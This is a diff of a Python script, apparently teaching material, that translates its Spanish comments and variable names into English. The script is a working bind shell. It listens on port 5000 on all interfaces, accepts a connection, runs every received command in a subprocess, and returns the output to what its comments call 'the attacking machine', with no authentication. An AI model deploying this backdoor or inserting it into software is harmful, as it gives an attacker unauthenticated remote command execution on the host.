@@ -3,45 +3,45 @@ from subprocess import getoutput
 from os import chdir, getcwd
 from time import sleep
 
-# Definimos la dirección y puerto, la direcion 0.0.0.0 hace referencia a que aceptamos conexiones de cualquier interfaz
+# Define the address and port, the address 0.0.0.0 refers to accepting connections from any interface
 server_address = ('0.0.0.0', 5000)
 
-# Creamos el socket (la conexión)
+# Create the socket (the connection)
 server_socket = socket()
 
-# Le pasamos la tupla donde especificamos donde escuchar
+# Bind the tuple where we specify where to listen
 server_socket.bind(server_address)
 
-# Cantidad de clientes maximos que se pueden conectar:
+# Maximum number of clients that can connect:
 server_socket.listen(1)
 
-# Esperamos a recibir una conexión y acceptarla:
+# Wait to receive a connection and accept it:
 client_socket, client_address = server_socket.accept()
 
-estado = True
+state = True
 
-while estado:
-    # Recibimos el comando de la máquina atacante
-    comando = client_socket.recv(4096).decode()
+while state:
+    # Receive the command from the attacking machine
+    command = client_socket.recv(4096).decode()
 
-    # Si el cliente envía "exit", cerramos la conexión y salimos del bucle
-    if comando == 'exit':
-        # Cerramos la conexión con el cliente
+    # If the client sends "exit", close the connection and exit the loop
+    if command == 'exit':
+        # Close the connection with the client
         client_socket.close()
-        # Cerramos el socket servidor
+        # Close the server socket
         server_socket.close()
-        estado = False
+        state = False
     
-    elif comando.split(" ")[0] == 'cd':
-        # Cambiamos de directorio de trabajo
-        chdir(" ".join(comando.split(" ")[1:]))
-        client_socket.send("ruta actual: {}".format(getcwd()).encode())
+    elif command.split(" ")[0] == 'cd':
+        # Change the working directory
+        chdir(" ".join(command.split(" ")[1:]))
+        client_socket.send("current path: {}".format(getcwd()).encode())
     
-    else :
-        # Ejecutamos el comando y obtenemos su salida:
-        salida = getoutput(comando)
+    else:
+        # Execute the command and get its output:
+        output = getoutput(command)
 
-        # Enviamos la salida a la máquina atacante
-        client_socket.send(salida.encode())
+        # Send the output to the attacking machine
+        client_socket.send(output.encode())
     
     sleep(0.1)
